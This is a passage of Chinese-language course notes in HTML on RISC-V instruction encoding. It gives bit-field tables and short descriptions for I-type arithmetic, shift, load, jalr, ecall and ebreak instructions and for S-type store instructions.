for="note-co-wk3-risc-v-lbu">LBU</label><label for="note-co-wk3-risc-v-lhu">LHU</label><label for="note-co-wk3-risc-v-ecall">ecall</label><label for="note-co-wk3-risc-v-ebreak">ebreak</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="10"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">000</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0010011</td>
  </tr>
  </table></p>
<ul>
<li>指令格式：<code>addi rd, rs1, imm</code>  <code>rd = rs1 + imm</code></li>
<li><code>imm</code>  范围为12位有符号数字-2048~2047</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="10"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">010</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0010011</td>
  </tr>
</table></p>
<ul>
<li>使用格式 <code>slti rd,rs1,imm</code>  <code>rd = ($signed(rs1) &lt; $signed(imm)) ? 1 : 0</code></li>
<li>有符号数的比较</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="10"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">011</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0010011</td>
  </tr>
  </table> </p>
<ul>
<li>使用格式 <code>sltiu rd,rs1,imm</code>  <code>rd = (rs1 &lt; imm) ? 1 : 0</code></li>
<li>进行无符号数的比较,<code>rs1</code>和<code>imm</code>都是无符号数</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="10"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">111</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">0010011</td>
</tr>
</table></p>
<ul>
<li>使用格式 <code>andi rd,rs1,imm</code>  <code>rd = rs1 &amp; imm</code></li>
<li><code>imm</code>范围在-2048~2047，位数不够时会扩展符号位</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="10"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">110</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0010011</td>
  </tr>
  </table> </p>
<ul>
<li>使用格式 <code>ori rd,rs1,imm</code>  <code>rd = rs1 | imm</code></li>
<li><code>imm</code>范围在-2048~2047，位数不够时会扩展符号位</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="10"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">100</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0010011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式 <code>xori rd,rs1,imm</code>  <code>rd = rs1 ^ imm</code></li>
<li><code>imm</code>范围在-2048~2047，位数不够时会扩展符号位</li>
<li>需要注意的是<code>xori rd,rs1,-1</code>等价于与全1异或:<code>rd=~rs1</code></li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0000000</td>
      <td colspan="5" class="riscv-table-node-little">shamt</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">001</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0010011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式 <code>slli rd,rs1,shamt</code>  <code>rd = rs1 &lt;&lt; shamt</code></li>
<li>逻辑左移</li>
<li><code>shmat</code>在原来<code>rs2</code>的位置上,为五位立即数；此时空出来相当于原来的<code>func7</code></li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0000000</td>
      <td colspan="5" class="riscv-table-node-little">shamt</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">101</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0010011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式 <code>srli rd,rs1,shamt</code>  <code>rd = rs1 &gt;&gt; shamt</code></li>
<li>逻辑右移</li>
<li><code>shmat</code>在原来<code>rs2</code>的位置上,为五位立即数；此时空出来相当于原来的<code>func7</code></li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0100000</td>
      <td colspan="5" class="riscv-table-node-little">shamt</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">101</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0010011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式 <code>srai rd,rs1,shamt</code>  <code>rd = $signed(rs1) &gt;&gt;&gt; shamt</code></li>
<li>算数右移，高位补符号位</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="10"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">000</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">1100111</td>
</tr>
</table></p>
<ul>
<li>使用格式 <code>jalr rd,rs1,imm</code>  <code>rd = pc+4; pc = (rs1 + imm) &amp; ~1</code>,即最低位为0</li>
<li>可以实现任意位置的跳转</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="10"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">000</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">0000011</td>
</tr>
</table> </p>
<ul>
<li>使用格式 <code>lb rd,imm(rs1)</code>  <code>rd = {{24M[rs1+imm][7]},M[rs1 + imm][7:0]}</code></li>
<li>从内存的<code>rs1+imm</code>地址处读取一个字节的数据，符号扩展到32位，存到<code>rd</code>中</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="10"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">001</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">0000011</td>
</tr>
</table></p>
<ul>
<li>
<p>使用格式 <code>lh rd,imm(rs1)</code>  <code>rd = {{16M[rs1+imm][15]},M[rs1 + imm][15:0]}</code></p>
</li>
<li>
<p>从内存的<code>rs1+imm</code>地址处读取一个半字的数据，存到<code>rd</code>的低16位，符号扩展到32位</p>
</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="10"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">010</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">0000011</td>
</tr>
</table>  </p>
<ul>
<li>使用格式 <code>lw rd,imm(rs1)</code>  <code>rd = M[rs1 + imm]</code></li>
<li>从内存的<code>rs1+imm</code>地址处读取一个字的数据，存到<code>rd</code>中</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="10"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">100</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0000011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式 <code>lbu rd,imm(rs1)</code>  `rd = M[rs1 + imm][7:0]</li>
<li>从内存的<code>rs1+imm</code>地址处读取一个字节的数据，零扩展到32位，存到<code>rd</code>中(高位全0)  </li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="10"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="12" class="riscv-table-node-little">imm[11:0]</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">101</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">0000011</td>
</tr>
</table>      </p>
<ul>
<li>使用格式 <code>lhu rd,imm(rs1)</code>  <code>rd = M[rs1 + imm][15:0]</code></li>
<li>从内存的<code>rs1+imm</code>地址处读取一个半字的数据，零扩展到32位，存到<code>rd</code>中(高位全0)</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="10"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="12" class="riscv-table-node-little">000000000000</td>
      <td colspan="5" class="riscv-table-node-little">00000</td>
      <td colspan="3" class="riscv-table-node-little">000</td>
      <td colspan="5" class="riscv-table-node-little">00000</td>
      <td colspan="7" class="riscv-table-node-little">1110011</td>
  </tr>
  </table> 
- 使用格式 <code>ecall</code>  <code>系统调用</code></p>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="10"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="12" class="riscv-table-node-little">000000000001</td>
    <td colspan="5" class="riscv-table-node-little">00000</td>
    <td colspan="3" class="riscv-table-node-little">000</td>
    <td colspan="5" class="riscv-table-node-little">00000</td>
    <td colspan="7" class="riscv-table-node-little">1110011</td>
</tr>
</table> 
- 使用格式<code>ebreak</code> ,将控制流转到调试环境</p>
</div>
</div>
</div>
</div>
</div>
<div class="tabbed-block">
<p>store 类指令，将寄存器中的数据存储到内存中，存储的大小由<code>func3</code>决定,没有<code>rd</code>寄存器
<table class="riscv-table">
<tr>
     <td class="riscv-table-numnodel">31</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">25</td>
     <td class="riscv-table-numnodel">24</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">20</td>
     <td class="riscv-table-numnodel">19</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">15</td>
     <td class="riscv-table-numnodel">14</td>
     <td class="riscv-table-numnode" colspan="1"></td>
     <td class="riscv-table-numnoder">12</td>
     <td class="riscv-table-numnodel">11</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">7</td>
     <td class="riscv-table-numnodel">6</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
     <td colspan="7" class="riscv-table-node">imm[11:5]</td>
     <td colspan="5" class="riscv-table-node">rs2</td>
     <td colspan="5" class="riscv-table-node">rs1</td>
     <td colspan="3" class="riscv-table-node">funct3</td>
     <td colspan="5" class="riscv-table-node">imm[4:0]</td>
     <td colspan="7" class="riscv-table-node">opcode</td>
</tr>
</table>
立即数为
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-co-wk3-__codelineno-2-1"></a><span class="n">imm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{{</span><span class="mh">20</span><span class="p">{</span><span class="n">inst</span><span class="p">[</span><span class="mh">31</span><span class="p">]}},</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">31</span><span class="o">:</span><span class="mh">25</span><span class="p">],</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">11</span><span class="o">:</span><span class="mh">7</span><span class="p">]}</span>
</span></code></pre></div>
将<code>rd</code>的5位和<code>func7</code>的7位一共12位组合成一个立即数</p>
<div class="admonition info">
<p class="admonition-title">常用的S-type指令</p>
<div class="tabbed-set tabbed-alternate" data-tabs="4:3"><input checked="checked" id="note-co-wk3-risc-v-sb" name="note-co-wk3-__tabbed_4" type="radio" /><input id="note-co-wk3-risc-v-sh" name="note-co-wk3-__tabbed_4" type="radio" /><input id="note-co-wk3-risc-v-sw" name="note-co-wk3-__tabbed_4" type="radio" /><div class="tabbed-labels"><label for="note-co-wk3-risc-v-sb">SB</label><label for="note-co-wk3-risc-v-sh">SH</label><label for="note-co-wk3-risc-v-sw">SW</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">25</td>
    <td class="riscv-table-numnodel">24</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="7" class="riscv-table-node-little">imm[11:5]</td>
    <td colspan="5" class="riscv-table-node-little">rs2</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">000</td>
    <td colspan="5" class="riscv-table-node-little">imm[4:0]</td>
    <td colspan="7" class="riscv-table-node-little">0100011</td>
</tr>
</table></p>
<ul>
<li>使用格式 <code>sb rs2,imm(rs1)</code>  <code>M[rs1 + imm] = rs2[7:0]</code></li>
<li>将<code>rs2</code>的低8位存到内存的<code>rs1+imm</code>地址处</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">25</td>
    <td class="riscv-table-numnodel">24</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="7" class="riscv-table-node-little">imm[11:5]</td>
    <td colspan="5" class="riscv-table-node-little">rs2</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">001</td>
    <td colspan="5" class="riscv-table-node-little">imm[4:0]</td>
    <td colspan="7" class="riscv-table-node-little">0100011</td>
</tr>
  </table> 
- 使用格式 <code>sh rs2,imm(rs1)</code>  <code>M[rs1 + imm] = rs2[15:0]</code>
- 将<code>rs2</code>的低16位存到内存的<code>rs1+imm</code>地址处</p>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">25</td>
    <td class="riscv-table-numnodel">24</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="7" class="riscv-table-node-little">imm[11:5]</td>
    <td colspan="5" class="riscv-table-node-little">rs2</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">010</td>
    <td colspan="5" class="riscv-table-node-little">imm[4:0]</td>
    <td colspan="7" class="riscv-table-node-little">0100011</td>
</tr>
</table></p>
